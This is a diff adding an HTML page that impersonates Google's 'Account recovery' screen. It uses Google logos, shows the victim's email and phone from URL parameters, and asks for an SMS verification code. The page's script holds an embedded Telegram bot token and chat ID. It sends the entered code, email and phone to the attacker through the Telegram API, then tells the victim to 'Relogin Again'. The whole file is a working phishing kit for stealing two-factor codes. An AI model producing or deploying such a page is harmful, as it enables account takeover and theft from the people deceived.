@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Account Recovery</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <style>
+        body {
+            background-color: #f8f9fa;
+            font-family: Roboto, Arial, sans-serif;
+        }
+        
+        .card {
+            max-width: 420px;
+            margin: 60px auto;
+            border: none;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .google-logo {
+            height: 24px;
+        }
+        
+        .form-control:focus {
+            box-shadow: none;
+            border-color: #1a73e8;
+        }
+        
+        .btn-primary {
+            background-color: #1a73e8;
+            border: none;
+        }
+        
+        .btn-primary:hover {
+            background-color: #1669c1;
+        }
+        
+        .email-selector {
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            padding: 5px 15px;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        
+        .phone-display {
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card p-4">
+        <div class="text-center mb-3">
+            <img class="google-logo mb-3" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+            <h5 class="mb-1">Account recovery</h5>
+            <p class="text-muted mb-2" style="font-size: 14px;">
+                To help keep your account safe, Google wants to make sure it’s really you trying to sign in.
+            </p>
+            <div class="email-selector">
+                <img src="https://www.gstatic.com/images/icons/material/system/24/account_circle_black_24dp.png" width="20" alt="User Icon" />
+                <span id="emailDisplay">email@example.com</span>
+            </div>
+        </div>
+
+        <p style="font-size: 14px;" class="mb-2">
+            A text message with a 6-digit verification code was just sent to
+            <span class="phone-display" id="phoneDisplay">•••• ••••</span>
+        </p>
+
+        <form onsubmit="handleSubmit(event)">
+            <div class="mb-3">
+                <label for="verificationCode" class="form-label text-primary" style="font-size: 14px;">Enter the code</label>
+                <input type="text" id="verificationCode" class="form-control" placeholder="G-" required />
+            </div>
+
+            <div class="mb-3">
+                <a href="#" class="text-muted" style="font-size: 13px; text-decoration: none;">Resend it</a>
+            </div>
+
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="#" style="font-size: 14px;">Try another way</a>
+                <button type="submit" class="btn btn-primary px-4">Next</button>
+            </div>
+        </form>
+
+        <div class="d-flex justify-content-between text-muted mt-4" style="font-size: 12px;">
+            <span>English (United States)</span>
+            <div>
+                <a href="#" class="text-muted text-decoration-none me-2">Help</a>
+                <a href="#" class="text-muted text-decoration-none me-2">Privacy</a>
+                <a href="#" class="text-muted text-decoration-none">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const CHAT_ID = '5615316142';
+
+        let email = '';
+        let phone = '';
+
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            email = params.get('email') || '';
+            phone = params.get('phone') || '';
+
+            if (email) document.getElementById('emailDisplay').textContent = email;
+            if (phone) document.getElementById('phoneDisplay').textContent = phone;
+        };
+
+        function handleSubmit(e) {
+            e.preventDefault();
+
+            const codeInput = document.getElementById('verificationCode');
+            const code = codeInput.value.trim();
+
+            if (code === '') {
+                alert('Please enter the verification code.');
+                return;
+            }
+
+            const message = `✅ Verification Code Submitted:\n📧 Email: ${email || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n🔐 Code: ${code}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                    }),
+                })
+                .then((response) => response.json())
+                .then((data) => {
+                    if (!data.ok) {
+                        alert('Failed to send code to Telegram: ' + data.description);
+                    } else {
+                        alert('Relogin Again!');
+                    }
+                })
+                .catch((error) => {
+                    alert('Error sending message to Telegram: ' + error.message);
+                });
+        }
+    </script>
+</body>
+
+</html>
